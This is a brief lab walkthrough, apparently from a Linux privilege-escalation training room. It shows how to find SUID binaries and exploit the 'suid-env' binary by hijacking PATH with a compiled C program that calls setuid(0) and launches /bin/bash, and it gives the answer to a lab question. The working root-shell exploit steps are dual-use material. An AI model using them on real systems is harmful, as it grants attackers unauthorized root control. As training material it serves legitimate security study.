**Detection**

Linux VM

1. In command prompt type: 

```
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20240601222555.png]]

2. From the output, make note of all the SUID binaries.

3. In command prompt type: 

```
strings /usr/local/bin/suid-env
```

![[Pasted image 20240601222738.png]]


4. From the output, notice the functions used by the binary.

**Exploitation**

Linux VM

1. In command prompt type:

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

2. In command prompt type: 
   
```
gcc /tmp/service.c -o /tmp/service
```

3. In command prompt type: 
   
```
export PATH=/tmp:$PATH
```

4. In command prompt type: 
   
```
/usr/local/bin/suid-env
```

5. In command prompt type: 
   
```
id
```

![[Pasted image 20240601222829.png]]


Answer the questions below

| Question                                                               | Answer                |
| ---------------------------------------------------------------------- | --------------------- |
| What is the last line of the "strings /usr/local/bin/suid-env" output? | service apache2 start |
